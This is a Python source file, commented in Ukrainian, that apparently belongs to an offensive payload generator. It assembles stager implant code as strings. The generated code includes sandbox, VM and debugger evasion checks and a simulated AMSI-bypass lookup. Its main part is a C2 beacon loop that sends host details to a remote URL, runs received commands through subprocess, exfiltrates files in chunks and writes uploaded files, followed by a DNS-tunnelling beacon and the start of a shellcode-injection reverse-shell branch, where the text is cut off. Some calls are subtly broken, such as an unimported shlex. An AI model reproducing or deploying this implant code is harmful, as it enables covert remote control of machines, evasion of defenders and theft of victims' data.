# payload_generator/stager_templates.py
# Містить логіку для генерації коду різних архетипів стейджерів

import random # Для генерації ID імплантів у стейджерах
import os # Для os.name, os.getlogin, etc. у коді стейджера
from datetime import datetime # Для позначки часу в стейджері

# Імпорти з кореневих файлів проекту
import config # Для доступу до config.VERSION_BACKEND

def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfuscated_data_b64: str, validated_params: dict, log_messages: list) -> str:
    """
    Генерує рядковий Python-код для вказаного архетипу стейджера.
    """
    log_messages.append(f"[STAGER_TEMPLATE_INFO] Генерація коду для архетипу: {archetype_name}")

    # Отримуємо значення з validated_params, які потрібні для формування коду стейджера
    enable_evasion_checks = validated_params.get('enable_evasion_checks', False)
    enable_amsi_bypass_concept = validated_params.get('enable_amsi_bypass_concept', False)
    enable_disk_size_check = validated_params.get('enable_disk_size_check', False)
    
    stager_code_lines = [
        f"# SYNTAX Conceptual Python Stager (Backend Generated v{config.VERSION_BACKEND})",
        f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"# Archetype: {archetype_name}",
        f"OBFUSCATION_KEY_EMBEDDED = \"{obfuscation_key}\"",
        f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
        f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
        f"EVASION_CHECKS_APPLIED = {enable_evasion_checks}",
        f"AMSI_BYPASS_CONCEPT_APPLIED = {enable_amsi_bypass_concept}",
        f"DISK_SIZE_CHECK_APPLIED = {enable_disk_size_check}",
    ]

    if archetype_name == "powershell_downloader_stager":
        ps_args = validated_params.get("powershell_execution_args", "")
        stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
    elif archetype_name == "demo_c2_beacon_payload":
        stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}"
        stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
        stager_code_lines.append(f"BEACON_INTERVAL_SEC = {random.randint(10, 25)}")
    elif archetype_name == "dns_beacon_c2_concept":
        stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
        stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
        stager_code_lines.append(f"DNS_BEACON_SUBDOMAIN_PREFIX = \"{validated_params.get('dns_beacon_subdomain_prefix')}\"")
        stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC = {random.randint(25, 55)}")

    stager_code_lines.extend([
        "", 
        "import base64", 
        "import os", 
        "import time", 
        "import random", 
        "import string", 
        "import subprocess", 
        "import socket", 
        "import json as json_stager_module"
    ])
    
    if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept":
        stager_code_lines.extend(["import urllib.request", "import urllib.error"])

    needs_ctypes = False
    if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
       enable_evasion_checks or enable_amsi_bypass_concept or enable_disk_size_check:
        needs_ctypes = True
        stager_code_lines.append("import ctypes")

    # Умовний імпорт shutil для Linux/macOS disk check або Linux shellcode
    needs_shutil = False
    if (os.name != 'nt' and enable_disk_size_check): # shutil потрібен для disk_usage на POSIX
        needs_shutil = True
    
    if needs_shutil and "import shutil" not in stager_code_lines: # Перевірка, щоб не дублювати
         stager_code_lines.append("import shutil")


    if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
        stager_code_lines.append("import mmap as mmap_module")
    
    stager_code_lines.append("")

    decode_func_name_runtime = "dx_runtime"
    evasion_func_name_runtime = "ec_runtime"
    execute_func_name_runtime = "ex_runtime"

    stager_code_lines.extend([
        f"def {decode_func_name_runtime}(b64_data, key_str):",
        "    try:",
        "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
        "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')", 
        "    except Exception as e_decode_rt: return f\"DECODE_ERROR_RUNTIME: {{str(e_decode_rt)}}\"",
        "    o_chars = []",
        "    for i_char_idx in range(len(temp_decoded_str)):",
        "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
        "    return \"\".join(o_chars)",
        "",
        f"def {evasion_func_name_runtime}():",
        "    print(\"[STAGER_EVASION_RUNTIME] Виконання розширених концептуальних перевірок ухилення...\")",
        "    indicators = []",
        "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
        "    try:",
        "        current_user = os.getlogin().lower()", # Потребує import os
        "        if current_user in common_sandbox_users: indicators.append('common_username_detected_rt')",
        "    except Exception: pass",
        "    try:",
        "        if os.name == 'nt':", # Потребує import os
        "            kernel32_ev_dbg = ctypes.windll.kernel32", # Потребує import ctypes
        "            if kernel32_ev_dbg.IsDebuggerPresent() != 0:",
        "                indicators.append('debugger_present_win_rt')",
        "    except Exception: pass",
        "    try:",
        "        sleep_duration_seconds = random.uniform(1.8, 3.3)", # Потребує import random, time
        "        time_before_sleep = time.monotonic()",
        "        time.sleep(sleep_duration_seconds)",
        "        time_after_sleep = time.monotonic()",
        "        elapsed_time = time_after_sleep - time_before_sleep",
        "        if elapsed_time < (sleep_duration_seconds * 0.65):",
        "            indicators.append('time_acceleration_heuristic_rt')",
        "    except Exception: pass",
        "    vm_files_artifacts = [",
        "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\",",
        "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",",
        "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
        "    ]",
        "    for vm_file_path in vm_files_artifacts:",
        "        if os.path.exists(vm_file_path):", # Потребує import os
        "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}_rt')",
        "            break",
        "    try:",
        "        hostname = socket.gethostname().lower()", # Потребує import socket
        "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\", \"lab\", \"desktop-\", \"DESKTOP-\"]",
        "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
        "            indicators.append('suspicious_hostname_keyword_rt')",
        "    except Exception: pass",
        "    try:",
        "        cpu_count = os.cpu_count()", # Потребує import os
        "        if cpu_count is not None and cpu_count < 2:",
        "            indicators.append('low_cpu_core_count_rt')",
        "    except Exception: pass",
        "    try:",
        "        if os.name == 'nt':", # Потребує import os
        "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]", # Потребує import ctypes
        "            pt1 = POINT()",
        "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))",
        "            time.sleep(random.uniform(0.3, 0.7))", # Потребує import time, random
        "            pt2 = POINT()",
        "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))",
        "            if pt1.x == pt2.x and pt1.y == pt2.y:",
        "                 indicators.append('no_mouse_activity_win_rt')",
        "    except Exception: pass",
        "    suspicious_processes = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'idag.exe', 'idaw.exe', 'fiddler.exe', 'tcpview.exe', 'autoruns.exe']",
        "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check_rt')", # Потребує import random
        "",
        "    if random.random() < 0.08: indicators.append('simulated_api_hook_check_rt')", # Потребує import random
        "",
        "    if AMSI_BYPASS_CONCEPT_APPLIED and os.name == 'nt':", # Потребує import os
        "        print(\"[STAGER_EVASION_AMSI_RUNTIME] Спроба концептуального обходу AMSI...\")",
        "        try:",
        "            amsi_dll_name_b64_rt = 'YW1zaS5kbGw='",
        "            amsi_scan_buffer_b64_rt = 'QW1zaVNjYW5CdWZmZXI='",
        "            amsi_dll_name_rt = base64.b64decode(amsi_dll_name_b64_rt).decode('utf-8')", # Потребує import base64
        "            amsi_scan_buffer_name_rt = base64.b64decode(amsi_scan_buffer_b64_rt).decode('utf-8')",
        "",
        "            kernel32_amsi_rt = ctypes.WinDLL('kernel32', use_last_error=True)", # Потребує import ctypes
        "            amsi_handle_rt = kernel32_amsi_rt.LoadLibraryA(amsi_dll_name_rt.encode('ascii'))",
        "            if not amsi_handle_rt:",
        "                print(f\"[STAGER_EVASION_AMSI_WARN_RT] Не вдалося завантажити {{amsi_dll_name_rt}}: {{ctypes.get_last_error()}}\")",
        "            else:",
        "                amsi_scan_buffer_addr_rt = kernel32_amsi_rt.GetProcAddress(amsi_handle_rt, amsi_scan_buffer_name_rt.encode('ascii'))",
        "                if not amsi_scan_buffer_addr_rt:",
        "                    print(f\"[STAGER_EVASION_AMSI_WARN_RT] Не вдалося отримати адресу {{amsi_scan_buffer_name_rt}}: {{ctypes.get_last_error()}}\")",
        "                else:",
        "                    patch_code_hex_rt = 'C3'",
        "                    patch_byte_rt = bytes.fromhex(patch_code_hex_rt)[0]",
        "                    original_byte_rt = (ctypes.c_char).from_address(amsi_scan_buffer_addr_rt).value",
        "                    print(f\"[STAGER_EVASION_AMSI_SIM_RT] Концептуальний 'патчинг' {{amsi_scan_buffer_name_rt}} за адресою {{hex(amsi_scan_buffer_addr_rt)}}.\")",
        "                    print(f\"  Оригінальний байт: {{hex(ord(original_byte_rt))}}, 'патч': {{hex(patch_byte_rt)}} (симуляція, не застосовано).\")",
        "                    indicators.append('amsi_bypass_attempted_sim_rt')",
        "            if amsi_handle_rt : kernel32_amsi_rt.FreeLibrary(amsi_handle_rt)",
        "        except Exception as e_amsi_rt:",
        "            print(f\"[STAGER_EVASION_AMSI_ERROR_RT] Помилка під час симуляції обходу AMSI: {{e_amsi_rt}}\")",
        "            indicators.append('amsi_bypass_exception_sim_rt')",
        "",
        "    if DISK_SIZE_CHECK_APPLIED:",
        "        print(\"[STAGER_EVASION_DISK_RUNTIME] Концептуальна перевірка розміру диска...\")",
        "        try:",
        "            min_disk_size_gb_threshold_rt = 50",
        "            total_bytes_rt = 0",
        "            if os.name == 'nt':", # Потребує import os
        "                free_bytes_available_to_caller_rt = ctypes.c_ulonglong(0)", # Потребує import ctypes
        "                total_number_of_bytes_rt = ctypes.c_ulonglong(0)",
        "                total_number_of_free_bytes_rt = ctypes.c_ulonglong(0)",
        "                kernel32_disk_rt = ctypes.windll.kernel32",
        "                success_rt = kernel32_disk_rt.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\\\'),",
        "                                                      ctypes.byref(free_bytes_available_to_caller_rt),",
        "                                                      ctypes.byref(total_number_of_bytes_rt),",
        "                                                      ctypes.byref(total_number_of_free_bytes_rt))",
        "                if success_rt:",
        "                    total_bytes_rt = total_number_of_bytes_rt.value",
        "                else:",
        "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN_RT] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
        "            else:", 
        "                try:",
        "                    disk_usage_stats_rt = shutil.disk_usage('/')", # Потребує import shutil (якщо needs_shutil)
        "                    total_bytes_rt = disk_usage_stats_rt.total",
        "                except NameError: ",
        "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX_RT] Модуль shutil не імпортовано для перевірки диска.\")",
        "                except Exception as e_disk_posix_rt:",
        "                    print(f\"[STAGER_EVASION_DISK_WARN_POSIX_RT] Помилка отримання розміру диска /: {{e_disk_posix_rt}}\")",
        "",
        "            if total_bytes_rt > 0:",
        "                total_gb_rt = total_bytes_rt / (1024**3)",
        "                print(f\"[STAGER_EVASION_DISK_INFO_RT] Загальний розмір диска: {{total_gb_rt:.2f}} GB.\")",
        "                if total_gb_rt < min_disk_size_gb_threshold_rt:",
        "                    indicators.append(f'low_disk_size_{{total_gb_rt:.0f}}gb_rt')",
        "            else:",
        "                 print(\"[STAGER_EVASION_DISK_INFO_RT] Не вдалося визначити загальний розмір диска.\")",
        "        except Exception as e_disk_check_rt:",
        "            print(f\"[STAGER_EVASION_DISK_ERROR_RT] Помилка під час перевірки розміру диска: {{e_disk_check_rt}}\")",
        "            indicators.append('disk_size_check_exception_rt')",
        "",
        "    if indicators:",
        "        print(f\"[STAGER_EVASION_RUNTIME] Виявлено індикатори: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
        "        return True",
        "    print(\"[STAGER_EVASION_RUNTIME] Перевірки ухилення пройдені (концептуально).\")",
        "    return False",
        "",
        f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
        "    try:",
        "        payload_params = json_stager_module.loads(payload_params_json)", # Потребує import json as json_stager_module
        "    except Exception as e_json_parse_rt:",
        "        print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка розпаковки параметрів: {{e_json_parse_rt}}\")",
        "        return",
        "    print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Ініціалізація логіки з параметрами: {{str(payload_params)[:200]}}...\")",
        # Логіка для demo_c2_beacon_payload
        "    if arch_type == 'demo_c2_beacon_payload':",
        "        beacon_url = payload_params.get('c2_url')",
        "        implant_data_rt = {", 
        "            'implant_id': STAGER_IMPLANT_ID,", # Використовує глобальну змінну стейджера
        "            'hostname': socket.gethostname(),", # Потребує import socket
        "            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown_user',", # Потребує import os
        "            'os_type': os.name,", # Потребує import os
        "            'pid': os.getpid(),", # Потребує import os
        "            'beacon_interval_sec': BEACON_INTERVAL_SEC", # Використовує глобальну змінну стейджера
        "        }",
        "        last_task_result_package_rt = None",
        "        exfil_state_rt = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
        "",
        "        while True:",
        "            current_beacon_payload_rt = implant_data_rt.copy()",
        "            if last_task_result_package_rt:",
        "                current_beacon_payload_rt['last_task_id'] = last_task_result_package_rt.get('task_id')",
        "                current_beacon_payload_rt['last_task_result'] = last_task_result_package_rt.get('result')",
        "                current_beacon_payload_rt['task_success'] = last_task_result_package_rt.get('success', False)",
        "                last_task_result_package_rt = None",
        "",
        "            if exfil_state_rt['active'] and exfil_state_rt['file_handle']:",
        "                try:",
        "                    chunk_data_rt = exfil_state_rt['file_handle'].read(exfil_state_rt['chunk_size'])",
        "                    if chunk_data_rt:",
        "                        chunk_b64_rt = base64.b64encode(chunk_data_rt).decode('utf-8')", # Потребує import base64
        "                        exfil_result_rt = {",
        "                            'file_path': exfil_state_rt['file_path'],",
        "                            'chunk_num': exfil_state_rt['current_chunk'],",
        "                            'total_chunks': exfil_state_rt['total_chunks'],",
        "                            'data_b64': chunk_b64_rt,",
        "                            'is_final': False",
        "                        }",
        "                        current_beacon_payload_rt['file_exfil_chunk'] = exfil_result_rt",
        "                        print(f\"[PAYLOAD_EXFIL_RT] Підготовлено чанк #{{exfil_state_rt['current_chunk']}} для {{exfil_state_rt['file_path']}}\")",
        "                        exfil_state_rt['current_chunk'] += 1",
        "                    else:",
        "                        exfil_state_rt['file_handle'].close()",
        "                        exfil_result_rt = {",
        "                            'file_path': exfil_state_rt['file_path'],",
        "                            'chunk_num': exfil_state_rt['current_chunk'] -1, ",
        "                            'total_chunks': exfil_state_rt['total_chunks'],",
        "                            'data_b64': '',",
        "                            'is_final': True",
        "                        }",
        "                        current_beacon_payload_rt['file_exfil_chunk'] = exfil_result_rt",
        "                        print(f\"[PAYLOAD_EXFIL_RT] Завершено ексфільтрацію файлу {{exfil_state_rt['file_path']}}.\")",
        "                        exfil_state_rt = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
        "                except Exception as e_exfil_read_rt:",
        "                    print(f\"[PAYLOAD_EXFIL_ERROR_RT] Помилка читання чанка файлу: {{e_exfil_read_rt}}\")",
        "                    if exfil_state_rt['file_handle']: exfil_state_rt['file_handle'].close()",
        "                    exfil_state_rt = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
        "                    current_beacon_payload_rt['file_exfil_error'] = str(e_exfil_read_rt)",
        "",
        "            try:",
        "                print(f\"[PAYLOAD_BEACON_RT] Надсилання маячка на {{beacon_url}} з даними: {{ {k: (v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v) for k,v in current_beacon_payload_rt.items()} }}\")",
        "                data_encoded_rt = json_stager_module.dumps(current_beacon_payload_rt).encode('utf-8')", # Потребує import json as json_stager_module
        "                req_rt = urllib.request.Request(beacon_url, data=data_encoded_rt, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})", # Потребує import urllib.request
        "                with urllib.request.urlopen(req_rt, timeout=20) as response_rt:",
        "                    response_data_raw_rt = response_rt.read().decode('utf-8')",
        "                    print(f\"[PAYLOAD_BEACON_RT] Відповідь C2 (статус {{response_rt.status}}): {{response_data_raw_rt[:200]}}...\")",
        "                    c2_response_parsed_rt = json_stager_module.loads(response_data_raw_rt)",
        "                    next_task_rt = c2_response_parsed_rt.get('c2_response', {}).get('next_task')",
        "",
        "                if next_task_rt and next_task_rt.get('task_type'):",
        "                    task_id_rt = next_task_rt.get('task_id')",
        "                    task_type_rt = next_task_rt.get('task_type')",
        "                    task_params_str_rt = next_task_rt.get('task_params', '')",
        "                    print(f\"[PAYLOAD_TASK_RT] Отримано завдання ID: {{task_id_rt}}, Тип: {{task_type_rt}}, Парам: '{{str(task_params_str_rt)[:100]}}...' \")",
        "                    task_output_rt = ''",
        "                    task_success_rt = False",
        "                    try:",
        "                        if task_type_rt == 'exec_command':",
        "                            cmd_parts_rt = shlex.split(task_params_str_rt)", # Потребує import shlex (вже є в глобальних імпортах)
        "                            print(f\"[PAYLOAD_TASK_EXEC_RT] Виконання команди: {{cmd_parts_rt}}\")",
        "                            proc_rt = subprocess.run(cmd_parts_rt, capture_output=True, text=True, shell=False, timeout=20, encoding='utf-8', errors='ignore')", # Потребує import subprocess
        "                            task_output_rt = f'STDOUT:\\n{{proc_rt.stdout}}\\nSTDERR:\\n{{proc_rt.stderr}}'",
        "                            task_success_rt = proc_rt.returncode == 0",
        "                        elif task_type_rt == 'list_directory':",
        "                            path_to_list_rt = task_params_str_rt if task_params_str_rt else '.'",
        "                            print(f\"[PAYLOAD_TASK_EXEC_RT] Перелік директорії: {{path_to_list_rt}}\")",
        "                            listed_items_rt = os.listdir(path_to_list_rt)", # Потребує import os
        "                            task_output_rt = f\"Перелік '{{path_to_list_rt}}':\\n\" + \"\\n\".join(listed_items_rt)",
        "                            task_success_rt = True",
        "                        elif task_type_rt == 'get_system_info':",
        "                            task_output_rt = f'Hostname: {{socket.gethostname()}}\\nOS: {{os.name}}\\nUser: {{implant_data_rt[\"username\"]}}'", # Потребує socket, os
        "                            task_success_rt = True",
        "                        elif task_type_rt == 'exfiltrate_file_chunked':",
        "                            file_to_exfil_rt = task_params_str_rt",
        "                            print(f\"[PAYLOAD_TASK_EXFIL_INIT_RT] Ініціалізація ексфільтрації файлу: {{file_to_exfil_rt}}\")",
        "                            if os.path.exists(file_to_exfil_rt) and os.path.isfile(file_to_exfil_rt):", # Потребує os
        "                                exfil_state_rt['file_path'] = file_to_exfil_rt",
        "                                exfil_state_rt['file_handle'] = open(file_to_exfil_rt, 'rb')",
        "                                exfil_state_rt['current_chunk'] = 0",
        "                                file_size_rt = os.path.getsize(file_to_exfil_rt)",
        "                                exfil_state_rt['total_chunks'] = (file_size_rt + exfil_state_rt['chunk_size'] - 1) // exfil_state_rt['chunk_size']",
        "                                exfil_state_rt['active'] = True",
        "                                task_output_rt = f'Розпочато ексфільтрацію файлу {{file_to_exfil_rt}}. Розмір: {{file_size_rt}} байт, Чанків: {{exfil_state_rt[\"total_chunks\"]}}.'",
        "                                task_success_rt = True",
        "                            else:",
        "                                task_output_rt = f'Помилка ексфільтрації: Файл {{file_to_exfil_rt}} не знайдено або не є файлом.'",
        "                                task_success_rt = False",
        "                        elif task_type_rt == 'upload_file_b64':",
        "                            upload_params_rt = task_params_str_rt",
        "                            remote_upload_path_rt = upload_params_rt.get('path')",
        "                            file_content_b64_rt = upload_params_rt.get('content_b64')",
        "                            if remote_upload_path_rt and file_content_b64_rt:",
        "                                print(f\"[PAYLOAD_TASK_UPLOAD_RT] Завантаження файлу на {{remote_upload_path_rt}} (розмір B64: {{len(file_content_b64_rt)}})\")",
        "                                try:",
        "                                    decoded_file_content_rt = base64.b64decode(file_content_b64_rt.encode('utf-8'))", # Потребує base64
        "                                    with open(remote_upload_path_rt, 'wb') as f_upload_rt:",
        "                                        f_upload_rt.write(decoded_file_content_rt)",
        "                                    task_output_rt = f'Файл успішно завантажено на {{remote_upload_path_rt}}.'",
        "                                    task_success_rt = True",
        "                                except Exception as e_upload_rt:",
        "                                    task_output_rt = f'Помилка запису завантаженого файлу {{remote_upload_path_rt}}: {{e_upload_rt}}'",
        "                                    task_success_rt = False",
        "                            else:",
        "                                task_output_rt = 'Помилка завдання upload_file_b64: відсутній шлях або вміст.'",
        "                                task_success_rt = False",
        "                        else:",
        "                            task_output_rt = f'Невідомий тип завдання: {{task_type_rt}}'",
        "                            task_success_rt = False",
        "                        print(f\"[PAYLOAD_TASK_RESULT_RT] Результат завдання '{{task_type_rt}}':\\n{{task_output_rt[:300]}}{{'...' if len(task_output_rt) > 300 else ''}}\")",
        "                    except Exception as e_task_exec_rt:",
        "                        task_output_rt = f'Помилка виконання завдання {{task_type_rt}}: {{str(e_task_exec_rt)}}'",
        "                        task_success_rt = False",
        "                        print(f\"[PAYLOAD_TASK_ERROR_RT] {{task_output_rt}}\")",
        "                    last_task_result_package_rt = {'task_id': task_id_rt, 'result': task_output_rt, 'success': task_success_rt}",
        "                    continue",
        "                else:",
        "                    print(f\"[PAYLOAD_BEACON_RT] Нових завдань від C2 не отримано.\")",
        "                    last_task_result_package_rt = None",
        "",
        "            except urllib.error.URLError as e_url_rt:", # Потребує urllib.error
        "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Помилка мережі (URLError) під час відправки маячка: {{e_url_rt}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
        "            except socket.timeout:", # Потребує socket
        "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Таймаут під час відправки маячка. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
        "            except json_stager_module.JSONDecodeError as e_json_rt:", # Потребує json as json_stager_module
        "                response_data_raw_local_rt = response_data_raw_rt if 'response_data_raw_rt' in locals() else 'N/A'",
        "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Помилка декодування JSON відповіді від C2: {{e_json_rt}}. Відповідь: {{response_data_raw_local_rt}}\")",
        "            except Exception as e_beacon_loop_rt:",
        "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Загальна помилка в циклі маячка: {{e_beacon_loop_rt}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
        "            ",
        "            if not next_task_rt and not exfil_state_rt['active']:",
        "                print(f\"[PAYLOAD_BEACON_RT] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
        "                time.sleep(BEACON_INTERVAL_SEC)", # Потребує time
        "            elif exfil_state_rt['active']:",
        "                 time.sleep(random.uniform(0.1, 0.5))", # Потребує time, random
        # Логіка для dns_beacon_c2_concept
        "    elif arch_type == 'dns_beacon_c2_concept':",
        "        c2_zone_rt = payload_params.get('dns_zone')",
        "        dns_prefix_rt = DNS_BEACON_SUBDOMAIN_PREFIX", 
        "        implant_id_dns_rt = STAGER_IMPLANT_ID",
        "        beacon_interval_rt = DNS_BEACON_INTERVAL_SEC",
        "        last_task_result_dns_rt = None",
        "",
        "        def encode_data_for_dns_rt(data_dict):", # Локальна функція
        "            try:",
        "                json_data_rt = json_stager_module.dumps(data_dict, separators=(',', ':'))",
        "                encoded_full_rt = base64.b32encode(json_data_rt.encode('utf-8')).decode('utf-8').rstrip('=').lower()",
        "                chunk_size_rt = 60",
        "                return [encoded_full_rt[i:i + chunk_size_rt] for i in range(0, len(encoded_full_rt), chunk_size_rt)]",
        "            except Exception as e_enc_rt:",
        "                print(f\"[DNS_BEACON_ERROR_RT] Помилка кодування даних: {{e_enc_rt}}\")",
        "                return [\"encodeerror_rt\"]",
        "",
        "        print(f\"[PAYLOAD_DNS_BEACON_RT] Ініціалізація DNS C2. Зона: {{c2_zone_rt}}, Префікс: {{dns_prefix_rt}}, ID: {{implant_id_dns_rt}}\")",
        "        while True:",
        "            beacon_data_to_send_rt = {'id': implant_id_dns_rt, 'status': 'beaconing_dns_rt'}",
        "            if last_task_result_dns_rt:",
        "                beacon_data_to_send_rt['last_task_id'] = last_task_result_dns_rt.get('task_id')",
        "                beacon_data_to_send_rt['result'] = last_task_result_dns_rt.get('result_summary', 'No summary')",
        "                last_task_result_dns_rt = None",
        "",
        "            encoded_data_chunks_rt = encode_data_for_dns_rt(beacon_data_to_send_rt)",
        "            next_task_dns_rt = None",
        "            for chunk_idx_rt, data_chunk_rt in enumerate(encoded_data_chunks_rt):",
        "                query_hostname_rt = f\"{{data_chunk_rt}}.p{{chunk_idx_rt}}.{{implant_id_dns_rt.lower().replace('-', '')[:10]}}.{{dns_prefix_rt}}.{{c2_zone_rt}}\"",
        "                print(f\"[PAYLOAD_DNS_BEACON_RT] Симуляція DNS-запиту (тип A/TXT) для: {{query_hostname_rt}}\")",
        "                sim_c2_dns_url_rt = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname_rt}}&id={{implant_id_dns_rt}}'",
        "                try:",
        "                    print(f\"[PAYLOAD_DNS_BEACON_RT] Симуляція запиту до DNS Resolver (через HTTP): {{sim_c2_dns_url_rt}}\")",
        "                    req_dns_rt = urllib.request.Request(sim_c2_dns_url_rt, headers={'User-Agent': 'SyntaxDNSBeaconClient/1.0'})",
        "                    with urllib.request.urlopen(req_dns_rt, timeout=10) as response_dns_rt:",
        "                        dns_response_raw_rt = response_dns_rt.read().decode('utf-8')",
        "                        print(f\"[PAYLOAD_DNS_BEACON_RT] Відповідь від симулятора DNS Resolver: {{dns_response_raw_rt[:200]}}...\")",
        "                        dns_response_parsed_rt = json_stager_module.loads(dns_response_raw_rt)",
        "                        if dns_response_parsed_rt.get('success') and dns_response_parsed_rt.get('dns_txt_response_payload'):",
        "                            task_data_b64_rt = dns_response_parsed_rt['dns_txt_response_payload']",
        "                            decoded_task_json_bytes_rt = base64.b64decode(task_data_b64_rt.encode('utf-8'))",
        "                            decoded_task_json_str_rt = decoded_task_json_bytes_rt.decode('utf-8')",
        "                            next_task_dns_rt = json_stager_module.loads(decoded_task_json_str_rt)",
        "                            print(f\"[PAYLOAD_DNS_BEACON_RT] Розкодовано завдання з DNS TXT: {{next_task_dns_rt}}\")",
        "                        elif dns_response_parsed_rt.get('success') and dns_response_parsed_rt.get('task_data'):",
        "                            next_task_dns_rt = dns_response_parsed_rt.get('task_data')",
        "                except Exception as e_dns_sim_http_rt:",
        "                    print(f\"[PAYLOAD_DNS_BEACON_ERROR_RT] Помилка HTTP-запиту до симулятора DNS: {{e_dns_sim_http_rt}}\")",
        "                if next_task_dns_rt: break",
        "",
        "            if next_task_dns_rt and next_task_dns_rt.get('task_type'):",
        "                task_id_dns_rt = next_task_dns_rt.get('task_id')",
        "                task_type_dns_rt = next_task_dns_rt.get('task_type')",
        "                task_params_str_dns_rt = next_task_dns_rt.get('task_params', '')",
        "                print(f\"[PAYLOAD_DNS_TASK_RT] Отримано завдання (через DNS) ID: {{task_id_dns_rt}}, Тип: {{task_type_dns_rt}}, Парам: '{{task_params_str_dns_rt}}'\")",
        "                task_output_dns_rt = f'DNS_TASK_SIM_RESULT_RT: {{task_type_dns_rt}} ({{task_params_str_dns_rt}}) - OK'",
        "                last_task_result_dns_rt = {'task_id': task_id_dns_rt, 'result_summary': task_output_dns_rt[:50]}",
        "                time.sleep(random.uniform(0.5, 1.0))",
        "            else:",
        "                print(f\"[PAYLOAD_DNS_BEACON_RT] Нових завдань через DNS не отримано.\")",
        "                last_task_result_dns_rt = None",
        "            ",
        "            print(f\"[PAYLOAD_DNS_BEACON_RT] Очікування {{beacon_interval_rt}} секунд до наступного DNS маячка...\")",
        "            time.sleep(beacon_interval_rt)",
        # Логіка для demo_file_lister_payload
        "    elif arch_type == 'demo_file_lister_payload':",
        "        try:",
        "            target_dir_rt = payload_params.get('directory', '.')",
        "            target_dir_rt = target_dir_rt if target_dir_rt and target_dir_rt.strip() != '.' else os.getcwd()",
        "            files_rt = os.listdir(target_dir_rt)",
        "            print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Перелік директорії '{{target_dir_rt}}': {{files_rt[:5]}} {'...' if len(files_rt) > 5 else ''}\")",
        "        except Exception as e_list_rt:",
        "            print(f\"[PAYLOAD_RUNTIME_ERROR ({{arch_type}})] Помилка переліку директорії '{{payload_params.get('directory')}}': {{e_list_rt}}\")",
        # Логіка для demo_echo_payload
        "    elif arch_type == 'demo_echo_payload':",
        "        print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Відлуння: {{payload_params.get('message')}}\")",
        # Логіка для reverse_shell_tcp_shellcode_windows_x64
        "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
        "        print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
        "        try:",
        "            shellcode_hex_rt = payload_params.get('shellcode')",
        "            if not shellcode_hex_rt or len(shellcode_hex_rt) % 2 != 0:",
